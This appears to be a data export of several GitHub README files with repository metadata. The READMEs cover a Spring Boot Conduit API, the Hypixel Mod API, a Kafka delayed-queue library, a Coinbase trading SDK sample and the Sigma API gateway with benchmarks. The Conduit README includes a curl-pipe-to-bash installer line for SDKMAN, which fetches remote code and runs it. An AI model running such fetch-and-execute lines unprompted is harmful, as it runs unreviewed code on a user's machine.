[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=coverage)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)

## Tech Stack
* [Java 21](https://dev.java/)
* [Spring Boot](https://spring.io/projects/spring-boot)
* [Spring Security](https://spring.io/projects/spring-security)
* [Spring Modulith](https://spring.io/projects/spring-modulith)
* [jOOQ](https://www.jooq.org/)
* [PostgreSQL](https://www.postgresql.org/)
* [FlywayDB](https://flywaydb.org/)
* [JUnit 5](https://junit.org/junit5/)
* [Testcontainers](https://testcontainers.com/)
* [Docker Compose](https://docs.docker.com/compose/)

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install maven
```

Verify the prerequisites

```shell
$ java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Temurin-21.0.1+12 (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Temurin-21.0.1+12 (build 21.0.1+12-LTS, mixed mode)

$ docker info
Client:
 Version:    27.0.3
 Context:    desktop-linux
 ...
 ...
Server:
 Server Version: 27.0.3
 ...
 ...

$ docker compose version
Docker Compose version v2.28.1-desktop.1
```

## How to?

```shell
# Clone the repository
$ git clone https://github.com/sivaprasadreddy/spring-realworld-conduit-api.git
$ cd spring-realworld-conduit-api

# Run tests
$ ./mvnw test

# Automatically format code using spotless-maven-plugin
$ ./mvnw spotless:apply

# Run/Debug application from IDE
Run `src/main/java/conduit/ConduitApplication.java` from IDE.

# Run application using Maven
./mvnw spring-boot:run
```

The application is configured to use Docker Compose to automatically start the application dependencies
such as PostgreSQL.

* PostgreSQL container connection properties:
  ```shell
  host: localhost
  port: 65432
  username: postgres
  password: postgres
  database: postgres
  ```
* Application run on port http://localhost:8080
* Swagger UI: http://localhost:8080/swagger-ui/index.html

## Using [Taskfile](https://taskfile.dev/) utility
Task is a task runner that we can use to run any arbitrary commands in easier way.

### Installation

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest

#verify task version
$ task --version
Task version: 3.35.1
```

### Using `task` to perform various tasks:

```shell

# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```
",0,1,4,mit,0.0,"['spring', 'boot', 'realworld', 'conduit', 'api', 'spring', 'boot', 'realworld', 'conduit', 'api', 'implement', 'api', 'endpoint', 'conduit', 'clone', 'tech', 'stack', 'java', 'spring', 'boot', 'spring', 'security', 'spring', 'modulith', 'jooq', 'postgresql', 'flywaydb', 'junit', 'testcontainers', 'docker', 'compose', 'prerequisite', 'jdk', 'docker', 'docker', 'compose', 'favourite', 'ide', 'recommended', 'intellij', 'idea', 'install', 'jdk', 'using', 'sdkman', 'verify', 'prerequisite', 'application', 'configured', 'use', 'docker', 'compose', 'automatically', 'start', 'application', 'dependency', 'postgresql', 'postgresql', 'container', 'connection', 'property', 'application', 'run', 'port', 'http', 'swagger', 'ui', 'http', 'using', 'taskfile', 'utility', 'task', 'task', 'runner', 'use', 'run', 'arbitrary', 'command', 'easier', 'way', 'installation', 'using', 'perform', 'various', 'task']","['spring', 'docker', 'boot', 'conduit', 'api']",0,0,0,"['spring', 'boot', 'realworld', 'conduit', 'api', 'tech', 'stack', 'prerequisite', 'how', 'to', 'clone', 'repository', 'run', 'test', 'automatically', 'format', 'code', 'use', 'application', 'ide', 'run', 'application', 'use', 'maven', 'use', 'taskfile', 'http', 'utility', 'installation', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container']",16,"['use', 'run', 'application', 'test', 'automatically']",6,4.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:properties-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.testcontainers:testcontainers-jooq-codegen-maven-plugin]",0.0,1.0,0.0,3623,50.1,5.403193612774452,"['API Endpoints -> https://realworld-docs.netlify.app/docs/specs/backend-specs/endpoints', 'Conduit -> https://github.com/gothinkster/realworld', '![CI Build -> https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml/badge.svg', '![Quality Gate Status -> https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=alert_status', '![Coverage -> https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=coverage', 'Java 21 -> https://dev.java/', 'Spring Boot -> https://spring.io/projects/spring-boot', 'Spring Security -> https://spring.io/projects/spring-security', 'Spring Modulith -> https://spring.io/projects/spring-modulith', 'jOOQ -> https://www.jooq.org/', 'PostgreSQL -> https://www.postgresql.org/', 'FlywayDB -> https://flywaydb.org/', 'JUnit 5 -> https://junit.org/junit5/', 'Testcontainers -> https://testcontainers.com/', 'Docker Compose -> https://docs.docker.com/compose/', 'IntelliJ IDEA -> https://www.jetbrains.com/idea/', 'SDKMAN -> https://sdkman.io/', 'Taskfile -> https://taskfile.dev/']",18
HypixelDev/ModAPI,master,"# Hypixel Mod API

The Hypixel Mod API is an implementation of custom packets for communicating with the Hypixel Server via plugin
messages.

## Mod Distributions

Official downloads of the Hypixel Mod API can be found on [Modrinth](https://modrinth.com/mod/hypixel-mod-api).
To install the mod, simply download the JAR file and place it in your mods folder.

Currently, the Hypixel Mod API supports the following mod loaders and versions:

- [Fabric Latest](https://github.com/HypixelDev/FabricModAPI)
- [Forge 1.8.9](https://github.com/HypixelDev/ForgeModAPI)

If there is significant demand, support for additional versions and loaders may be considered.

## Developer Usage

It is recommended to read over the [FAQ](https://github.com/HypixelDev/ModAPI/wiki/FAQ) on the GitHub Wiki before implementing the Mod API.

For using the Mod API you will need to add it as a dependency to your project. This can be done via the public
Hypixel Maven repository.

```xml

<repository>
    <id>Hypixel</id>
    <url>https://repo.hypixel.net/repository/Hypixel/</url>
</repository>
```

This repo can also be used with Gradle.

```gradle
repositories {
    maven { url 'https://repo.hypixel.net/repository/Hypixel/' }
}
```

You can then include the dependency in your project.

```xml

<dependency>
    <groupId>net.hypixel</groupId>
    <artifactId>mod-api</artifactId>
    <version>1.0.1</version>
</dependency>
```

```gradle
dependencies {
    implementation 'net.hypixel:mod-api:1.0.1'
}
```

Depending on your chosen mod loader, you will need to also include the `hypixel-mod-api` as a required dependency. For
example in Fabric you would include the following in your `fabric.mod.json` file.

```json
{
  ""depends"": {
    ""hypixel-mod-api"": "">=1.0.1""
  }
}
```

## Example Usage

Once you have the API added to your project you can start using it. Below are examples of sending server-bound packets,
as well as receiving client-bound packets.

### Sending a Hypixel Packet

```java
public class Example {
    public void sendPacket() {
        HypixelModAPI.getInstance().sendPacket(new ServerboundPartyInfoPacket());
    }
}
```

### Registering a packet handler

```java

public class Example {
    public void registerPacketHandler() {
        HypixelModAPI.getInstance().createHandler(ClientboundLocationPacket.class, packet -> {
            packet.getServerName();
        });
    }
}
```

### Subscribing to a packet event

If you wish to receive a specific event packet, you will need to subscribe to the event. Once subscribed you can
register a packet handler as normal (see example above).

```java
public class Example {
    public void subscribeToPacketEvent() {
        HypixelModAPI.getInstance().subscribeToEventPacket(ClientboundLocationPacket.class);
    }
}
```

Registering for an event packet is only required one time during the Minecraft client lifecycle. You can register for
event packets at anytime, including in your mod initialization code before the player has connected.

The implementation of the Mod API will automatically notify the server of any registered events when receiving
the `ClientboundHelloPacket`.
",10,0,3,mit,23.0,"['hypixel', 'mod', 'api', 'hypixel', 'mod', 'api', 'implementation', 'custom', 'packet', 'communicating', 'hypixel', 'server', 'via', 'plugin', 'message', 'mod', 'distribution', 'official', 'downloads', 'hypixel', 'mod', 'api', 'found', 'modrinth', 'install', 'mod', 'simply', 'download', 'jar', 'file', 'place', 'mod', 'folder', 'currently', 'hypixel', 'mod', 'api', 'support', 'following', 'mod', 'loader', 'version', 'fabric', 'latest', 'forge', 'significant', 'demand', 'support', 'additional', 'version', 'loader', 'may', 'considered', 'developer', 'usage', 'recommended', 'read', 'faq', 'github', 'wiki', 'implementing', 'mod', 'api', 'using', 'mod', 'api', 'need', 'add', 'dependency', 'project', 'done', 'via', 'public', 'hypixel', 'maven', 'repository', 'repo', 'also', 'used', 'gradle', 'include', 'dependency', 'project', 'depending', 'chosen', 'mod', 'loader', 'need', 'also', 'include', 'required', 'dependency', 'example', 'fabric', 'would', 'include', 'following', 'file', 'example', 'usage', 'api', 'added', 'project', 'start', 'using', 'example', 'sending', 'packet', 'well', 'receiving', 'packet', 'sending', 'hypixel', 'packet', 'registering', 'packet', 'handler', 'subscribing', 'packet', 'event', 'wish', 'receive', 'specific', 'event', 'packet', 'need', 'subscribe', 'event', 'subscribed', 'register', 'packet', 'handler', 'normal', 'see', 'example', 'registering', 'event', 'packet', 'required', 'one', 'time', 'minecraft', 'client', 'lifecycle', 'register', 'event', 'packet', 'anytime', 'including', 'mod', 'initialization', 'code', 'player', 'connected', 'implementation', 'mod', 'api', 'automatically', 'notify', 'server', 'registered', 'event', 'receiving']","['mod', 'packet', 'api', 'hypixel', 'event']",7,0,0,"['hypixel', 'mod', 'api', 'mod', 'distribution', 'developer', 'usage', 'example', 'usage', 'send', 'hypixel', 'packet', 'register', 'packet', 'handler', 'subscribe', 'packet', 'event']",7,"['packet', 'hypixel', 'mod', 'usage', 'api']",8,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0,3142,23.88888888888889,5.395348837209302,"['Modrinth -> https://modrinth.com/mod/hypixel-mod-api', 'Fabric Latest -> https://github.com/HypixelDev/FabricModAPI', 'Forge 1.8.9 -> https://github.com/HypixelDev/ForgeModAPI', 'FAQ -> https://github.com/HypixelDev/ModAPI/wiki/FAQ']",4
cashfree/kafka-delayed-queue,main,"# Kafka Delayed Queue for Spring and Java

Kafka Delayed Queue is a library that facilitates delayed message processing in Kafka, tailored for Spring applications. This library leverages Kafka topics and scheduled tasks to efficiently manage and process delayed messages, ensuring high-throughput and reliable message handling.

## Features

- **Seamless Integration:** Easily integrate with Spring applications.
- **Configurable Delays:** Set customizable delay intervals for message processing.
- **High Throughput:** Optimized for handling large volumes of messages.
- **Scalable and Reliable:** Built on a robust architecture for scalability and reliability.

## Prerequisites

- **Java:** Version 8 or higher.
- **Apache Kafka:** Version 2.0.0 or higher.
- **Spring Boot:** Version 2.0 or higher.

## Getting Started

### 1. Create Kafka Topics
Create Kafka topics based on the formula: `2 * log2(MaxDelay)`. Ensure these topics are available in your Kafka cluster.

```shell
#!/bin/bash

# Check if the correct number of arguments are provided
if [ ""$#"" -ne 3 ]; then
    echo ""Usage: $0 <kafka_bin_path> <prefix> <n>""
    exit 1
fi

# Assign the arguments to variables
KAFKA_BIN_PATH=$1
PREFIX=$2
N=$3

# Loop through 1 to n and create topics
for (( i=1; i<=N; i++ ))
do
    DELAY_QUEUE_TOPIC=""${PREFIX}.delay-queue.delay-level-${i}""
    BITCHECK_QUEUE_TOPIC=""${PREFIX}.delay-queue.bitcheck-level-${i}""

    # Create delay queue topic
    ""${KAFKA_BIN_PATH}/kafka-topics.sh"" --create --topic ""${DELAY_QUEUE_TOPIC}"" --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1
    if [ $? -ne 0 ]; then
        echo ""Failed to create topic: ${DELAY_QUEUE_TOPIC}""
    else
        echo ""Successfully created topic: ${DELAY_QUEUE_TOPIC}""
    fi

    # Create bitcheck queue topic
    ""${KAFKA_BIN_PATH}/kafka-topics.sh"" --create --topic ""${BITCHECK_QUEUE_TOPIC}"" --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1
    if [ $? -ne 0 ]; then
        echo ""Failed to create topic: ${BITCHECK_QUEUE_TOPIC}""
    else
        echo ""Successfully created topic: ${BITCHECK_QUEUE_TOPIC}""
    fi
done

```

```commandline
./create_delay_kafka_topics.sh /usr/local/kafka/bin xyz 5
```

### 2. Install the Library
Download and install the JAR file from the Kafka Delayed Queue releases.

### 3. Enable Delayed Kafka Queue
Annotate your main application class or configuration class with `@EnableDelayKafkaQueue` to enable the delayed queue functionality.

### 4. Configure Kafka
Create a BaseKafkaConfig bean in your configuration file. Configure the topic prefix, maximum delay, and destination topic and Other Resources.

```java
@EnableKafka
@EnableDelayKafkaQueue
@Configuration
public class KafkaConsumerConfig extends BaseKafkaConfiguration {

  private final String kafkaBrokers;
  private final int kafkaConcurrency;
  private final String consumerGroup;
  private final Boolean sslEnabled;
  private final String trustStoreLocation;
  private final String trustStorePassword;
  private final String keyPassword;
  private final String keyStorePassword;
  private final String keyStoreLocation;
 ....

  @Bean
  public BaseKafkaConfig library() {
    BaseKafkaConfig baseKafkaConfig = new BaseKafkaConfig();
    baseKafkaConfig.setKafkaBrokers(this.kafkaBrokers);
    baseKafkaConfig.setConsumerGroup(this.consumerGroup);
    baseKafkaConfig.setSslEnabled(Boolean.FALSE);
    baseKafkaConfig.setKeyPassword(this.keyPassword);
    baseKafkaConfig.setKeyStoreLocation(this.keyStoreLocation);
    baseKafkaConfig.setKeyStorePassword(trustStorePassword);
    baseKafkaConfig.setTrustStoreLocation(trustStoreLocation);
    baseKafkaConfig.setTrustStorePassword(trustStorePassword);
    baseKafkaConfig.setMaxDelay(1000L);
    baseKafkaConfig.setTopicPrefix(""xyz"");
    baseKafkaConfig.setDestinationTopic(""xyz.delay-queue.final"");
    return baseKafkaConfig;
  }
}
```

### 5. Start Pushing Messages
Use the kafkaTemplate bean to start pushing messages into the queue.

```java
@Service
public class MessageProducer {
    
    
    private final KafkaTemplate<String, String> kafkaTemplate;

    private final KafkaDelayUtil kafkaDelayUtil;

    @Autowired
    public MessageProducer(
            KafkaTemplate<String, String> kafkaTemplate, KafkaDelayUtil kafkaDelayUtil) {
        this.kafkaTemplate = kafkaTemplate;
        this.kafkaDelayUtil = kafkaDelayUtil;
    }

    public void sendMessage(String message, long delay) {
        KafkaDelayedQueueMessage kafkaMsg = new KafkaDelayedQueueMessage();
        kafkaMsg.setDelay(duration.toSeconds());
        kafkaMsg.setMessage(message);
        kafkaMsg.setStartTime(LocalDateTime.now());
        kafkaMsg.setPushTime(LocalDateTime.now());

        Long level = KafkaDelayUtil.fetchIntialLevel(duration.toSeconds());
        

        kafkaTemplate.send(
                kafkaDelayUtil.fetchTopicByLevel(level),
                ObjectMapperUtil.stringify(kafkaMsg, Boolean.TRUE));
        
    }
}

```


### 5. Start Listening Messages in the destination topic

```java
@Slf4j
@Component
public class KafkaReconWorker {

    @KafkaListener(
            topics = ""xyz.delay-queue.final"")
    public void listen(String message) {

        KafkaDelayedQueueMessage delayedQueueMsg =
                ObjectMapperUtil.readValue(message, KafkaDelayedQueueMessage.class, Boolean.FALSE);

        System.out.println(""Message Received :: "" + delayedQueueMsg.getMessage());
        ....
    }
}

```





",1,0,1,apache-2.0,0.0,"['kafka', 'delayed', 'queue', 'spring', 'java', 'kafka', 'delayed', 'queue', 'library', 'facilitates', 'delayed', 'message', 'processing', 'kafka', 'tailored', 'spring', 'application', 'library', 'leverage', 'kafka', 'topic', 'scheduled', 'task', 'efficiently', 'manage', 'process', 'delayed', 'message', 'ensuring', 'reliable', 'message', 'handling', 'feature', 'seamless', 'integration', 'easily', 'integrate', 'spring', 'application', 'configurable', 'delay', 'set', 'customizable', 'delay', 'interval', 'message', 'processing', 'high', 'throughput', 'optimized', 'handling', 'large', 'volume', 'message', 'scalable', 'reliable', 'built', 'robust', 'architecture', 'scalability', 'reliability', 'prerequisite', 'java', 'version', 'higher', 'apache', 'kafka', 'version', 'higher', 'spring', 'boot', 'version', 'higher', 'getting', 'started', 'create', 'kafka', 'topic', 'create', 'kafka', 'topic', 'based', 'formula', 'ensure', 'topic', 'available', 'kafka', 'cluster', 'install', 'library', 'download', 'install', 'jar', 'file', 'kafka', 'delayed', 'queue', 'release', 'enable', 'delayed', 'kafka', 'queue', 'annotate', 'main', 'application', 'class', 'configuration', 'class', 'enable', 'delayed', 'queue', 'functionality', 'configure', 'kafka', 'create', 'basekafkaconfig', 'bean', 'configuration', 'file', 'configure', 'topic', 'prefix', 'maximum', 'delay', 'destination', 'topic', 'resources', 'start', 'pushing', 'message', 'use', 'kafkatemplate', 'bean', 'start', 'pushing', 'message', 'queue', 'start', 'listening', 'message', 'destination', 'topic']","['kafka', 'message', 'delayed', 'topic', 'queue']",0,0,0,"['kafka', 'delayed', 'queue', 'spring', 'java', 'feature', 'prerequisite', 'get', 'start', 'create', 'kafka', 'topic', 'check', 'correct', 'number', 'argument', 'provide', 'assign', 'argument', 'variable', 'loop', 'n', 'create', 'topic', 'create', 'delay', 'queue', 'topic', 'create', 'bitcheck', 'queue', 'topic', 'install', 'library', 'enable', 'delayed', 'kafka', 'queue', 'configure', 'kafka', 'start', 'push', 'message', 'start', 'listen', 'message', 'destination', 'topic']",15,"['topic', 'kafka', 'queue', 'create', 'start']",5,0.0,1.0,[com.diffplug.spotless:spotless-maven-plugin],0.0,1.0,0.0,5479,22.52,7.1172291296625225,[],0
coinbase-samples/advanced-sdk-java,main,"# Coinbase Advanced Trade Java SDK README

## Overview

The *Advanced Java SDK* is a sample library that demonstrates the structure of a [Coinbase Advanced Trade](https://advanced.coinbase.com/) driver for
the [REST APIs](https://docs.cdp.coinbase.com/advanced-trade/reference).

Coinbase Advanced Trade offers a comprehensive API for traders, providing access to real-time market data, order management, and execution. Elevate your trading strategies and develop sophisticated solutions using our powerful tools and features.

## License

The *Advanced Java SDK* sample library is free and open source and released under the [Apache License, Version 2.0](LICENSE).

The application and code are only available for demonstration purposes.

## Usage

To use the *Advanced Java SDK*, initialize the Credentials class and create a new client. The Credentials struct is JSON
enabled. See an example of this inside of the [main.java.com.coinbase.examples package](./src/main/java/com/coinbase/examples/Main.java). Ensure that Advanced API credentials are stored in a secure manner.

The JSON format expected for `Advanced_CREDENTIALS` is:

```
{
  ""apiKeyName"": """",
  ""privateKey"": """",
}
```

Coinbase Advanced API credentials can be created in the Advanced web console under API.

An example of instantiating the credentials and using the PortfoliosService is shown below:

```java
public class Main {
    public static void main(String[] args) {
        String credsStringBlob = System.getenv(""ADVANCED_TRADE_CREDENTIALS"");
        ObjectMapper mapper = new ObjectMapper();

        try {
            CoinbaseAdvancedCredentials credentials = new CoinbaseAdvancedCredentials(credsStringBlob);
            CoinbaseAdvancedClient client = new CoinbaseAdvancedClient(credentials);

            PortfoliosService portfoliosService = AdvancedServiceFactory.createPortfoliosService(client);
            GetPortfolioByIdResponse portfolioResponse = portfoliosService.getPortfolioById(
                    new GetPortfolioByIdRequest.Builder()
                            .portfolioId(portfolioId)
                            .build());

            System.out.println(mapper.writeValueAsString(portfolioResponse));
        } catch (Exception e) {
            e.printStackTrace(e);
        }
    }
}
```

To see a full working example, see the [`Main`](src/main/java/com/coinbase/examples/Main.java) class under the com.coinbase.examples package.

**Warning** This does place a very small trade for a small amount of ADA. Please ensure that you have the necessary funds in your account before running this code.

## Binaries

Binaries and dependency information for Maven, Gradle, Ivy and others can be found at the [Maven Central Repository](https://central.sonatype.com/search?q=g%3Acom.coinbase.advanced+a%3Acoinbase-advanced-sdk-java&smo=true)

Maven example:

```xml
<dependency>
    <groupId>com.coinbase.advanced</groupId>
    <artifactId>coinbase-advanced-sdk-java</artifactId>
    <version>x.y.z</version>
</dependency>
```

## Build

To build the sample library, ensure that Java Development Kit (JDK) is installed and then run:

```bash
mvn clean install
```
",1,0,1,apache-2.0,2.0,"['coinbase', 'advanced', 'trade', 'java', 'sdk', 'readme', 'overview', 'advanced', 'java', 'sdk', 'sample', 'library', 'demonstrates', 'structure', 'coinbase', 'advanced', 'trade', 'driver', 'rest', 'apis', 'coinbase', 'advanced', 'trade', 'offer', 'comprehensive', 'api', 'trader', 'providing', 'access', 'market', 'data', 'order', 'management', 'execution', 'elevate', 'trading', 'strategy', 'develop', 'sophisticated', 'solution', 'using', 'powerful', 'tool', 'feature', 'license', 'advanced', 'java', 'sdk', 'sample', 'library', 'free', 'open', 'source', 'released', 'apache', 'license', 'version', 'application', 'code', 'available', 'demonstration', 'purpose', 'usage', 'use', 'advanced', 'java', 'sdk', 'initialize', 'credential', 'class', 'create', 'new', 'client', 'credential', 'struct', 'json', 'enabled', 'see', 'example', 'inside', 'package', 'ensure', 'advanced', 'api', 'credential', 'stored', 'secure', 'manner', 'json', 'format', 'expected', 'coinbase', 'advanced', 'api', 'credential', 'created', 'advanced', 'web', 'console', 'api', 'example', 'instantiating', 'credential', 'using', 'portfoliosservice', 'shown', 'see', 'full', 'working', 'example', 'see', 'class', 'package', 'warning', 'place', 'small', 'trade', 'small', 'amount', 'ada', 'please', 'ensure', 'necessary', 'fund', 'account', 'running', 'code', 'binary', 'binary', 'dependency', 'information', 'maven', 'gradle', 'ivy', 'others', 'found', 'maven', 'central', 'repository', 'maven', 'example', 'build', 'build', 'sample', 'library', 'ensure', 'java', 'development', 'kit', 'jdk', 'installed', 'run']","['advanced', 'java', 'credential', 'coinbase', 'trade']",8,3,1,"['coinbase', 'advanced', 'trade', 'java', 'sdk', 'readme', 'overview', 'license', 'usage', 'binary', 'build']",6,"['coinbase', 'advanced', 'trade', 'java', 'sdk']",4,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,3159,27.571428571428573,6.0310880829015545,"['Coinbase Advanced Trade -> https://advanced.coinbase.com/', 'REST APIs -> https://docs.cdp.coinbase.com/advanced-trade/reference', 'Maven Central Repository -> https://central.sonatype.com/search?q=g%3Acom.coinbase.advanced+a%3Acoinbase-advanced-sdk-java&smo=true']",3
EasonLyo/sigma,main,"# SIGMA

👆[中文文档](./README_zh.md)

##  Introduction

Sigma is a high performances API gateway based on Vertx(Netty), can execute on native image.

### [Based on vertx](https://vertx.io/)
Vertx is a reactive web framework on JVM,  it provides many of out-of-the-box feature.

Thanks to the Vertx ecosystem, Sigma can achieve extremely high performance at a minimal cost.

Here is some vertx module sigma used:
- vertx core
- vertx web
- vertx http proxy
- vertx io_uring

### [Vertx io_uring](https://vertx.io/docs/vertx-io_uring-incubator/java/)
> The new io_uring interface added to the Linux Kernel 5.1 is a high I/O performance scalable interface for fully asynchronous Linux syscalls.

> Vert.x io_uring is based on Netty io_uring, more details on the GitHub project.

U can see more detail in [GitHub Project](https://github.com/netty/netty-incubator-transport-io_uring).

**With thd help of Vertx io_uring,sigma have high IO performance.**

### [Native transports](https://netty.io/wiki/native-transports.html)

> Vert.x can run with native transports (when available) on BSD (OSX) and Linux, these JNI transports add features specific to a particular platform, generate less garbage, and generally improve performance when compared to the NIO based transport.

**Sigma has improved data transfer speed with the help of Native Transport, although it can only work on some Linux and BSD systems, fortunately most services run on these systems.**

### [GraalVM native image](https://www.graalvm.org/latest/reference-manual/native-image/)

> Native Image is a technology to compile Java code ahead-of-time to a binary—a native executable. A native executable includes only the code required at run time, that is the application classes, standard-library classes, the language runtime, and statically-linked native code from the JDK.

When running applications as native executable files, compared to traditional Java running methods, it will have advantages such as faster startup speed, smaller packaging size, and smaller runtime memory usage.

**Sigma can be executed  as native executable files ,and it will adapt to the cloud native era better.**

**WARNING:**

By checking [GitHub actions runner image](https://github.com/actions/runner-images?tab=readme-ov-file) pre-installed software and [GraalVM Native image prerequisites](https://www.graalvm.org/latest/reference-manual/native-image/#prerequisites) requirements in GitHub actions, we found that the Windows 11 SDK is missing from the windows latest image of Github actions runner. If you need to use Sigma binary files for the Windows platform, please compile them yourself according to the documentation or deploy Sigma using Jar.

### [JAVA virtual thread](https://openjdk.org/jeps/444)

> Virtual threads are not faster threads — they do not run code any faster than platform threads. They exist to provide scale (higher throughput), not speed (lower latency). There can be many more of them than platform threads, so they enable the higher concurrency needed for higher throughput according to Little's Law.

For IO intensive tasks, the load is usually not limited by the CPU, and in this case, even if the number of threads exceeds the number of cores, throughput cannot be improved.

> Virtual threads help to improve the throughput of typical server applications precisely because such applications consist of a great number of concurrent tasks that spend much of their time waiting.

Unlike the OS threading model (which typically manages threads through thread pools to reduce the overhead of creating threads and reusing threads), virtual threads provide higher throughput while not offering lower latency.

**Sigma have a high concurrency performance with the help of Vertx's support for virtual thread.**

## Feature List

1. **Route**
2. **Upstream**
3. **reverse-proxy**
4. **Load balance**
5. **plugin**

## Example Usage

### binary
To begin, download the latest program for your operating system and architecture from the Release page.

Next, place the sigma binary and configuration file on your server.

Finally, edit the configuration.

#### Access your computer in a LAN network via SSH

##### Step 1 : modify `sigma.json` file.

As we can see, it has 5 part to edit. The part of `proxy-server` is a proxy server protocol config, u can just use it by default.

`port: 80`:  means sigma http proxy server will bind on port 80.

```json
{
  ""proxy-server"": {
    ""http"": {
      ""id"": ""http-proxy-server"",
      ""server-id"": ""http-proxy-server"",
      ""port"": 80
    }
  }
}
```
The part of `proxy-client` is a http proxy server config, we don't need to modify except we want to adjust it to improve some performances.  
```json
{
  ""proxy-client"": {
    ""max-pool-size-per-server"": 256
  }
}
```
The part of router is a main config which decide what request the proxy will handler.

`proxy-server-id`: it config this router is belonged to which proxy server.

`route`: it define an array of http request path to handle.

`proxy-pass-id`: This configuration determines which proxy pass rule it will submit the request to.
```json
{
  ""router"": [
    {
      ""id"": ""router-first"",
      ""enable"": true,
      ""proxy-server-id"": ""http-proxy-server"",
      ""route"": [
        {
          ""id"": ""router-first-route-first"",
          ""enable"": true,
          ""path"": ""/test/*"",
          ""allow-method"": [],
          ""consumes"": [],
          ""produces"": [],
          ""proxy-pass-id"": ""proxy-pass-1""
        }
      ]
    }
  ]
}
```
The part of `proxy-pass` is a main config, this configuration determines how to handle requests received by the proxy server.

`upstream-id`: this proxy requst will send to which upsteam.

```json
{
  ""proxy-pass"": [
    {
      ""id"": ""proxy-pass-1"",
      ""upstream-id"": ""upstream-static-service-1""
    }
  ]
}
```

The part of `upstream` is a main config, this configuration define the server discoverty method , load balance rule, and upstream nodes.

This is a simple example, it means we will send proxy request to `http://localhost:8888` by `round-robin`, and the upsteam list is a static config.
```json
{
  ""upstream"": [
    {
      ""id"": ""upstream-static-service-1"",
      ""discovery"": ""static-config"",
      ""rule-strategy"": ""round-robin"",
      ""nodes"": [
        ""http://localhost:8888""
      ]
    }
  ]
}
```

#### step2 : start sigma

```shell
./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1 
```

### jar

#### step1
The step 1 are similar to the binary step 1.

#### 

```shell
java -jar sigma-vX.X.X-fat.jar ./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1
```

## Roadmap

![ROADMAP](./image/SIGMA-ROADMAP-V0.1.0-ALPHA.png)

## Milestone

- 2024-10-08 the version 0.1.0-alpha is done.

## Benchmark

### Benchmark Environments

Apple M1 Pro(10 vCPUs, 16 GB memory)

### Benchmark Test for reverse proxy

Only use sigma as the reverse proxy server,include path rewrite plugin,with no logging,or other plugins enabled.

### QPS

Because of M1 Pro CPU arch , it dont have Hyper-Threading tech, so, The test use 4 core for wrk, 4 core for nginx or sigma reverse proxy, and 2 core for upstream, upstream is only return a simple json response:

```json
{
  ""code"": 200,
  ""msg"": ""success"",
  ""data"": null
}
```
#### Upstream(on port 8888 and 8889)

```wiki
~ % wrk -t8 -c2000 -d30s http://localhost:8888
Running 30s test @ http://localhost:8888
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     1.60ms    2.70ms 129.17ms   95.30%
    Req/Sec    17.01k     5.87k   31.22k    68.83%
  4070138 requests in 30.09s, 322.17MB read
  Socket errors: connect 1756, read 161, write 0, timeout 0
Requests/sec: 135264.76
Transfer/sec:     10.71MB
```

#### Nginx(on port 8081):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost:8081
Running 1m test @ http://localhost:8081
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.74ms    2.32ms 135.17ms   95.69%
    Req/Sec     8.20k     2.99k   16.62k    67.24%
  3908370 requests in 1.00m, 547.91MB read
  Socket errors: connect 1756, read 227, write 15, timeout 0
  Non-2xx or 3xx responses: 28
Requests/sec:  65119.80
Transfer/sec:      9.13MB
```

#### Sigma(on port 80, path rewrite /test/* to /):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost/test/benchmark   
Running 1m test @ http://localhost/test/benchmark
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.53ms    2.13ms 137.37ms   88.09%
    Req/Sec     8.55k     2.83k   14.77k    70.42%
  4087162 requests in 1.00m, 654.83MB read
  Socket errors: connect 1756, read 189, write 0, timeout 0
Requests/sec:  68079.91
Transfer/sec:     10.91MB
```
Sigma is just a little bit faster than Nginx in some situation, but it's still very fast and we have a lot of room to improve.

## Contributing

